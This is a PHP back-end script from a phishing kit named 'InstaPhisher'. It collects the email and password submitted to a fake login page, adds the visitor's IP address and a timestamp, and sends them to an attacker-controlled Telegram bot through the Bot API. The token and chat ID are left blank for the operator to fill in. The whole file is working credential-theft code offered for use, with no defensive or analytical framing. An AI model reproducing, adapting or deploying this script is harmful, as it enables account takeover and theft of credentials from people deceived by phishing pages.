<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip_address = $_SERVER['REMOTE_ADDR'];
}

$d = new DateTime("now", new DateTimeZone("America/New_York")); // Set Your country DF Time 
$time = $d->format("Y/m/d  h:i:s A");
if (isset($_POST['info'])) {
        $msg = urlencode("New Login From InstaPhisher : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Blaze Wheeler"); // Your Copyright goes here 
}



// Setting 
$apiToken = "******";
$YOUR_ID_TELE = "********";


// You :
$response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
// SomeOne Else : 
// $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
